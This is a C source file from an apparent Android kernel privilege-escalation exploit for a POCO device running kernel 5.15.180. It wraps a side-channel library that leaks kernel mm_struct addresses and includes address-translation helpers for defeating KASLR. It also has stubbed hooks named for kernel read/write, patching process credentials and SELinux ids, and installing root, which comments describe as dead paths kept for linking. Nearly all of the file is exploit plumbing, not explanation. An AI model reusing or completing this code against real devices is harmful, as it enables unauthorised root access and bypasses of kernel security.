#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

/* kernelsnitch shared state */
static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;

/*============================================================================*/
/*  SECTION 1 : KERNELSNITCH WRAPPERS                                         */
/*============================================================================*/

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

/*============================================================================*/
/*  SECTION 2 : MEMFD / CLONE HELPERS                                         */
/*============================================================================*/

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    _exit(0);
  }
  int fd = SYSCHK(open_memfd(child));
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  /* not used in DirtyPipe path; stubbed for linker compatibility */
}

/*============================================================================*/
/*  SECTION 3 : ADDRESS UTILITIES                                             */
/*============================================================================*/

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  /* not used in DirtyPipe path; stubbed for linker compatibility */
}

/*============================================================================*/
/*  SECTION 4 : DEAD CONFIGFS / ROOT STUBS (kept for linker compat)           */
/*============================================================================*/

/* These were the configfs ashmem transport + root escalation.
 * POCO 5.15.180 lacks the configfs bin-buffer repoint feature entirely,
 * so these paths are dead. Stubbed so the binary links. */

int try_cache_ashmem_path(const char *path) { (void)path; return 0; }
int same_rdev_path(const char *path, dev_t rdev) { (void)path; (void)rdev; return 0; }
void init_ashmem_path(void) { }
int open_ashmem_device(void) { return -1; }

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  (void)fd; (void)blob; (void)len; return -1;
}
int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  (void)fd; (void)blob; (void)pos; return -1;
}
int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  (void)fd; (void)blob; (void)len; return -1;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  (void)fd; (void)target; (void)data; (void)len; return -1;
}
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  (void)fd; (void)target; (void)data; (void)len; return -1;
}

/* kernel R/W via DirtyPipe (configfs-free).
 * NOTE: the old configfs physrw paths (pipe_reclaim_cache_gate, find_pipe_buffer,
 * pipe_phys_read/write) still call these — those paths are dead on POCO and
 * are not invoked by dirtypipe_init/read/write. These stubs satisfy the linker. */
ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  (void)fd; (void)target; (void)data; (void)len; return -1;
}
ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  (void)fd; (void)target; (void)data; (void)len; return -1;
}
uint64_t kernel_read64(int fd, uintptr_t target) {
  (void)fd; (void)target; return 0;
}

int spawn_root_child(void) { (void)root_child_pid; return -1; }
int collect_root_child(void) { return -1; }
uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  (void)fd; (void)want_tgid; return 0;
}
int patch_cred_identity(int fd, uintptr_t cred) {
  (void)fd; (void)cred; return -1;
}
int patch_cred_sid(int fd, uintptr_t cred) {
  (void)fd; (void)cred; return -1;
}
int patch_cred_object(int fd, uintptr_t cred) {
  (void)fd; (void)cred; return -1;
}
int install_android_root(int fd) {
  (void)fd; return -1;
}
int prepare_good_kernel_page(int payload_mode) {
  (void)payload_mode; return 0;
}

void close_reclaim_sockets(void) {}
